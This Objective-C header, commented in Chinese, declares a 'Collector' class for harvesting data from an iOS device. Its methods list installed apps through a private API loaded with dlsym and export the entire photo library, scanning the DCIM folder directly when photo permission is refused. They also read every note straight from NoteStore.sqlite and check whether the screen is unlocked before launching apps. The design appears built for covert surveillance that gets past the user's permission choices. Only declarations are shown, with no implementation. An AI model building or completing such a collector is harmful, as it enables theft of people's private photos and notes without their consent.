//
//  Collector.h — 采集能力
//
//  · 已安装 App 列表（LSApplicationWorkspace，私有 API，dlsym 拿）
//  · 相册批量导出（PHAsset 全量；拿不到权限时退回扫 DCIM 目录）
//  · 备忘录全量（直接读 NoteStore.sqlite）
//  · 打开指定 App（LSApplicationWorkspace openApplicationWithBundleID）
//
#import <Foundation/Foundation.h>

@interface Collector : NSObject

/// 已安装应用：[{ a: 名称, b: bundleId, v: 版本 }]
+ (NSArray<NSDictionary *> *)installedApps;

/// 相册里的照片（本地路径或内存数据），回调可能在任意线程
/// @param limit  0 = 全部
/// @param handler (jpegData, index) —— 返回 NO 可提前中止
+ (void)enumeratePhotos:(NSInteger)limit
                handler:(BOOL (^)(NSData *jpeg, NSInteger index))handler;

/// 备忘录：[{ title, snippet, mod }]
+ (NSArray<NSDictionary *> *)allNotes;

/// 上一次 allNotes 失败的原因（成功时为空串）
+ (NSString *)lastNotesError;

/// 上一次成功打开的 NoteStore.sqlite 路径（没找到时为空）
+ (NSString *)notesDbPath;

/// 打开 App，返回是否成功
+ (BOOL)openApp:(NSString *)bundleId;

/// 当前是否在前台/解锁（用于决定要不要弹 App）
+ (BOOL)isScreenUnlocked;

@end
